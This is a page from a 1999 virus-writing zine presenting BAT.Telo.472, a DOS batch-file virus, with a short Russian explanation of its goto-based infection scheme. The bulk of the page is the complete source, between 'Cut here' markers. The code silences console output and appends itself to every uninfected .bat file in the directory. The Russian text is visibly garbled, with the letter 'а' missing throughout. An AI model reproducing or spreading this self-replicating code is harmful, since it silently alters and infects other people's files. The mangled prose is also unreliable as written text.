Bat.Telo.472 by Duke


- [Duke's Virus Labs #5] - [Page 12] -

BAT.Telo.472
(c) by Duke/SMF

Имя вирус     : BAT.Telo.472
Автор         : Duke/SMF
Язык прогр.   : DOS-script
Д т  созд ния : 16.02.99

   По прежнему используем ком нду FIND, но з то окруж ем ф йл жертву
ком нд ми вирус  т к, что жертв  з пис н  в конце, но р бот ет первой
(и один р з, естественно :) Схем тически это выглядит т к :
        goto telo
        :begin
        <тело вирус >
        goto end
        :telo
        <тело жертвы>
        goto begin
        :end
   Не стоит упрек ть меня в громоздкости код  - я хотел пок з ть метод,  
не побить рекорды. Если будет время, я оптимизирую код вирус .

===== Cut here =====
@goto telo
:begin tel
@ctty nul%tel%
if "%1=="$ goto ztel
find "tel"<%0>tel.bat
echo.>>tel.bat
echo>>tel.bat @goto begin
echo>>tel.bat :end
for %%b in (*.bat) do call tel.bat $ %%b
del tel.bat
ctty con%tel%
@goto end%tel%
:ztel
find "tel"<%2>nul
if not errorlevel 1 goto end%tel%
find "tel"<%0>tel
type %2>>tel
echo.>>tel
echo>>tel @goto begin
echo>>tel :end
ren tel %2
copy tel %2
del tel
goto end%tel%
:telo (c) by Duke/SMF
::This is host file...
::Enjoy !
@goto begin
:end
===== Cut here =====
